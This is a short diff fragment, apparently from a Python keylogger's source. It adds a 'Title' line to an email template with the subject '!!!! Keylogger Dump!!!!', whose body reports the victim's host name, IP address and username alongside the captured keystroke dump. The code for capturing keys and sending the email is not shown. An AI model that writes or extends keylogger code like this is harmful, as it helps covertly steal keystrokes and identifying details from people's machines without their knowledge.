@@ -45,6 +45,7 @@ try:
             'Subject': '!!!! Keylogger Dump!!!!',
             'Email Body': ("""
               Keyloger Info and Dump:
+              Title: {}
               Host Name: {}
               Host IP: {}
               Host Username: {}
